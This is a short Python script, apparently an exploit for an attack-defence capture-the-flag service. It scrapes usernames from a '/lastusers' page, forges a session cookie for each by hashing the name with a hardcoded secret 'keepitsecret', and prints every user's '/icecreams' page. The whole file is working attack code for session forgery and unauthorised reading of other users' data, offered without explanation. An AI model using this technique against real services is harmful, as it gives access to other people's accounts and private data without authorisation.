import sys
import requests
import re
from hashlib import md5

URL = 'http://%s:5555' % sys.argv[1]

resp = requests.get(URL + '/lastusers')

users = re.findall('<br>(\w*)', resp.text)

for u in users:
    cookie = '{}:{}'.format(u, md5((u + 'keepitsecret').encode()).hexdigest())
    r = requests.get(URL + '/icecreams', cookies={'session': cookie})
    print(r.text)
